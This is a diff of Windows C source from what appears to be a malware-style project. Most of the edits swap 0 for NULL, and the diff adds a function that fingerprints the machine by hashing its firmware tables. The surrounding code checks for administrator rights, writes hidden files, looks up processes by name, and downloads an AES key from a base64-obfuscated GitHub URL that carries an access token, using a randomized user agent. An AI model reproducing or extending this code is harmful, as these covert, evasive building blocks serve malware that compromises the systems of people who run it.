@@ -6,7 +6,7 @@ BOOL IIsUserAdmin() {
 	BOOL bSId = AllocateAndInitializeSid(&(SID_IDENTIFIER_AUTHORITY)SECURITY_NT_AUTHORITY, 2,
 		SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSId);
 	if (bSId) {
-		if (!CheckTokenMembership(0, pSId, &bSId))
+		if (!CheckTokenMembership(NULL, pSId, &bSId))
 			bSId = FALSE;
 
 		FreeSid(pSId);
@@ -20,23 +20,23 @@ PVOID ELoadResourceW(
 	_In_  PCWSTR  pResType,
 	_Out_ PSIZE_T nBufferSize
 ) {
-	HRSRC hResInfo = FindResourceW(0, MAKEINTRESOURCEW(wResID), pResType);
+	HRSRC hResInfo = FindResourceW(NULL, MAKEINTRESOURCEW(wResID), pResType);
 	if (hResInfo) {
-		HGLOBAL hgData = LoadResource(0, hResInfo);
+		HGLOBAL hgData = LoadResource(NULL, hResInfo);
 		if (hgData) {
 			PVOID lpBuffer = LockResource(hgData);
 			if (!lpBuffer)
-				return 0;
+				return NULL;
 
-			*nBufferSize = SizeofResource(0, hResInfo);
+			*nBufferSize = SizeofResource(NULL, hResInfo);
 			if (!*nBufferSize)
-				return 0;
+				return NULL;
 
 			return lpBuffer;
 		}
 	}
 
-	return 0;
+	return NULL;
 }
 
 PDWORD EGetProcessIdbyName(
@@ -50,7 +50,7 @@ PDWORD EGetProcessIdbyName(
 	PROCESSENTRY32W pe32;
 	pe32.dwSize = sizeof(PROCESSENTRY32W);
 
-	PDWORD pProcesses = 0;
+	PDWORD pProcesses = NULL;
 	if (Process32FirstW(hPSnap, &pe32)) {
 		*nProcesses = 0;
 		do {
@@ -73,10 +73,10 @@ PVOID AllocReadFileW(
 	_In_  PCWSTR  szFileName,
 	_Out_ PSIZE_T nFileSize
 ) {
-	PVOID pRet = 0;
-	HANDLE hFile = CreateFileW(szFileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+	PVOID pRet = NULL;
+	HANDLE hFile = CreateFileW(szFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hFile == INVALID_HANDLE_VALUE)
-		return 0;
+		return NULL;
 
 	LARGE_INTEGER liFS;
 	BOOL bT = GetFileSizeEx(hFile, &liFS);
@@ -87,7 +87,7 @@ PVOID AllocReadFileW(
 	if (!pFile)
 		goto EXIT;
 
-	bT = ReadFile(hFile, pFile, liFS.LowPart, nFileSize, 0);
+	bT = ReadFile(hFile, pFile, liFS.LowPart, nFileSize, NULL);
 	if (!bT) {
 		FreeMemory(pFile);
 		goto EXIT;
@@ -104,15 +104,14 @@ BOOL WriteFileCW(
 	_In_ PVOID  pBuffer,
 	_In_ SIZE_T nBuffer
 ) {
-	HANDLE hFile = CreateFileW(pFileName, GENERIC_RW, FILE_SHARE_READ, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0);
+	HANDLE hFile = CreateFileW(pFileName, GENERIC_RW, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
 	if (hFile) {
 		DWORD dwT;
-		BOOL bT = WriteFile(hFile, pBuffer, nBuffer, &dwT, 0);
+		BOOL bT = WriteFile(hFile, pBuffer, nBuffer, &dwT, NULL);
 		CloseHandle(hFile);
 
 		return bT;
-	}
-	else
+	} else
 		return FALSE;
 }
 
@@ -127,7 +126,7 @@ PCWSTR GetFileNameFromPathW(
 			return pPath + i;
 	}
 
-	return 0;
+	return NULL;
 }
 
 BOOL EExtractResource(
@@ -143,33 +142,68 @@ BOOL EExtractResource(
 
 // Only Test rn but might be implemented further
 PVOID IDownloadKey() {
-	PCWSTR szAgent = EAllocRandomBase64StringW(8, 16);
-	HINTERNET hNet = InternetOpenW(szAgent, INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
+	PCWSTR szAgent = EAllocRandomBase64StringW(NULL, 8, 16);
+	HINTERNET hNet = InternetOpenW(szAgent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
 	if (!hNet)
-		return 0;
+		return NULL;
 	FreeMemory(szAgent);
 
 	PCSTR szB64URL = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0xpbWEtWC1Db2RpbmcvV2luMzIuX3JpZnQvbWFzdGVyL19yaWZ0L21haW4uYz90b2tlbj1BSVNMVElGQkxFWE5IREJIWDZaMkZPUzYzUUozVQA=";
 	SIZE_T nURL;
 	PCSTR szURL = EBase64Decode(szB64URL, 156, &nURL);
-	HINTERNET hUrl = InternetOpenUrlA(hNet, szURL, 0, 0, 0, 0);
+	HINTERNET hUrl = InternetOpenUrlA(hNet, szURL, NULL, 0, NULL, NULL);
 	if (!hUrl)
-		return 0;
+		return NULL;
 	FreeMemory(szURL);
 
 	PVOID pBuffer = AllocMemory(AES_BLOB_SIZE);
-
 	SIZE_T nRead;
 	InternetReadFile(hUrl, pBuffer, AES_BLOB_SIZE, &nRead);
 
 	InternetCloseHandle(hUrl);
 	InternetCloseHandle(hNet);
-
-	if ((nRead != AES_BLOB_SIZE) || ((DWORD)pBuffer != 0x4d42444b))
-		goto EXIT;
+	if ((nRead != AES_BLOB_SIZE) || ((DWORD)pBuffer != 0x4d42444b)) {
+		FreeMemory(pBuffer);
+		return NULL;
+	}
 
 	return pBuffer;
-EXIT:
-	FreeMemory(pBuffer);
-	return 0;
+}
+
+CONST STATIC DWORD dwFTPS[3] = {
+	'ACPI', 'FIRM', 'RSMB'
+};
+VOID IGenerateHwid(
+	_Out_ PVOID pHWID
+) {
+	// Prepare Hashing
+	BCRYPT_ALG_HANDLE ah;
+	BCryptOpenAlgorithmProvider(&ah, BCRYPT_MD5_ALGORITHM, NULL, NULL);
+	BCRYPT_HASH_HANDLE hh;
+	BCryptCreateHash(ah, &hh, NULL, 0, NULL, 0, NULL);
+
+	for (UINT8 i = 0; i < sizeof(dwFTPS) / sizeof(DWORD); i++) {
+		// Enumerate Table Entries
+		SIZE_T nTableId = EnumSystemFirmwareTables(dwFTPS[i], NULL, 0);
+		PDWORD pTableId = AllocMemory(nTableId);
+		EnumSystemFirmwareTables(dwFTPS[i], pTableId, nTableId);
+
+		for (UINT8 j = 0; j < nTableId / sizeof(DWORD); j++) {
+			// Get Table
+			SIZE_T nTable = GetSystemFirmwareTable(dwFTPS[i], pTableId[j], NULL, 0);
+			PVOID pTable = AllocMemory(nTable);
+			GetSystemFirmwareTable(dwFTPS[i], pTableId[j], pTable, nTable);
+
+			// Hash Table
+			BCryptHashData(hh, pTable, nTable, NULL);
+			FreeMemory(pTable);
+		}
+
+		FreeMemory(pTableId);
+	}
+
+	// Finish Hashing
+	BCryptFinishHash(hh, pHWID, MD5_SIZE, NULL);
+	BCryptDestroyHash(hh);
+	BCryptCloseAlgorithmProvider(ah, NULL);
 }
